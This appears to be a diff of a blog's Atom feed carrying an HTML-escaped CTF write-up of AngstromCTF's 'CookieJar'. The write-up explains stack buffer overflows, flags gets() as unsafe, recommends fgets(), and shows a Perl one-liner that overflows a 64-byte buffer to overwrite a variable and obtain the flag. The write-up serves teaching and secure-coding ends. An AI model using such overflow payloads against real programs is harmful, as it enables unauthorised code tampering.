-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gets(buffer);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;At this moment, you must be like “Yeah… OK… tell me more” and it’s normal if you’ve never encountered this kind of vulnerability.&lt;/p&gt;
-
-&lt;p&gt;However, this is probably one of the most common exploit and it’s called &lt;strong&gt;buffer overflow&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;what-is-a-buffer-overflow&quot;&gt;What is a buffer overflow?&lt;/h3&gt;
-
-&lt;p&gt;When a variable is declared, space is allocated on the stack according to the size of our variable.&lt;/p&gt;
-
-&lt;p&gt;Let’s take the example of the buffer from the challenge:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;After this instruction, &lt;strong&gt;64 bytes are allocated on the stack&lt;/strong&gt; in order to store the value contained in the buffer (A char is coded on a single byte in C).&lt;/p&gt;
-
-&lt;p&gt;In compiled languages such as C, the memory is allocated at the compilation time and this process is sequential. It means that the next variable found in the code will be located above the previous one on the stack.&lt;/p&gt;
-
-&lt;p&gt;Also keep in mind that &lt;strong&gt;the highest addresses are located at the bottom of the stack&lt;/strong&gt; in our architecture.&lt;/p&gt;
-
-&lt;p&gt;In the source code of the challenge, the very interesting variable &lt;strong&gt;numCookies&lt;/strong&gt; is declared just before the buffer. In other words, &lt;strong&gt;the buffer will be stored right above numCookies on the stack.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Let’s represent the hypotetical state of the stack:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2018-06-05/stack-draw.png&quot; alt=&quot;State of the stack&quot; title=&quot;State of the stack&quot; width=&quot;70%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;At this point, you should be able to start guessing the impact of such vulnerability.&lt;/p&gt;
-
-&lt;p&gt;Indeed, we have 64 bytes of memory allocated to our buffer, but what happens if we try to write more than 64 bytes?&lt;/p&gt;
-
-&lt;p&gt;Any idea? … It simply &lt;strong&gt;overwrites the values&lt;/strong&gt; stored in variables that are located below the buffer on the stack.&lt;/p&gt;
-
-&lt;h3 id=&quot;what-does-it-involve&quot;&gt;What does it involve?&lt;/h3&gt;
-
-&lt;p&gt;Overwriting variables in the stack can result in random effects if the attacker doesn’t control the impacted variables.&lt;/p&gt;
-
-&lt;p&gt;However, if the stack is perfectly controlled, the attack can occur a &lt;strong&gt;program crash&lt;/strong&gt; or &lt;strong&gt;provide full-rights on the machine&lt;/strong&gt; to the attacker by executing a shellcode.&lt;/p&gt;
-
-&lt;p&gt;Buffer overflows only act as &lt;strong&gt;vectors of attack&lt;/strong&gt;, they represent a way of gaining access or executing code on the machine but they often don’t symbolize the attack in its entirety. Once the access is granted on the machine, the funny things can start…&lt;/p&gt;
-
-&lt;p&gt;We will see more advanced exploits based on buffer overflows in future articles, don’t worry about that :wink:.&lt;/p&gt;
-
-&lt;h2 id=&quot;detection-of-the-vulnerable-code&quot;&gt;Detection of the vulnerable code&lt;/h2&gt;
-
-&lt;p&gt;Alright, this vulnerability seems really powerful but is there a way to prevent it? How do we identify the vulnerable piece of code?&lt;/p&gt;
-
-&lt;p&gt;In our case, the vulnerability is simple to exploit because of the lack of user input control. The following part of the code is vulnerable because the developper didn’t verify the length of the user input.&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A simple &lt;code class=&quot;highlighter-rouge&quot;&gt;man gets&lt;/code&gt; warns us about the usage of this function and its level of risk.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read,  and  because gets()  will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security. Use fgets() instead.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Here is what a careful developer should have written:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;OR&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;If you were to retain one thing from this article, as a developer, it would be this: &lt;strong&gt;NEVER TRUST USER INPUT&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;
-
-&lt;p&gt;Now that we have identified the &lt;strong&gt;vector of attack&lt;/strong&gt; and the piece of &lt;strong&gt;vulnerable code&lt;/strong&gt;, we can write the exploit!&lt;/p&gt;
-
-&lt;p&gt;Our objective is to bypass this “if statement”: &lt;code class=&quot;highlighter-rouge&quot;&gt;if (numCookies &amp;gt;= 100){&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;In order to do that, we have to set &lt;strong&gt;numCookies&lt;/strong&gt; to &lt;strong&gt;100 or greater&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Let’s get our hands dirty!&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;You get it, we have to submit more than 64 characters to the program.&lt;/p&gt;
-
-&lt;p&gt;There are 2 methods:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;You can enter the 64 characters manually when the program asks for a number of cookies.&lt;/li&gt;
-  &lt;li&gt;Or you can &lt;strong&gt;use a scripting language&lt;/strong&gt; such as python or perl to do it for you (Highly recommended).&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;To make sure the value of &lt;strong&gt;numCookies&lt;/strong&gt; is overwritten, we can write 80 characters thanks to the following command:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@csb:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;x80'&lt;/span&gt; | ./cookiePublic64
-Welcome to the Cookie Jar program!
-
-In order to get the flag, you will need to have 100 cookies!
-
-So, how many cookies are there &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the cookie jar:
-Congrats, you have 1094795585 cookies!
-Here&lt;span class=&quot;s1&quot;&gt;'s your flag: ----------REDACTED----------
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;It’s working! Now, we just have to execute our exploit on the remote server in order to get the flag :blush:.&lt;/p&gt;
-
-&lt;p&gt;I hope you now have a clearer idea of what is a buffer overflow. Do not hesitate to leave a comment or to contact me if you have any question or suggestion.&lt;/p&gt;
-
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">For my first article on this blog, I’ll present you my write-up of “CookieJar” from the AngstromCTF. This challenge was accessible and very straight-forward, which constitutes the prefect opportunity to introduce Buffer Overflows…</summary></entry></feed>
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Here comes the first Cryptographic challenge! We’ll start with an easy one but nonetheless useful. We will establish the mathematical foundations needed for understanding more complicated codes such as RSA…</summary></entry></feed>
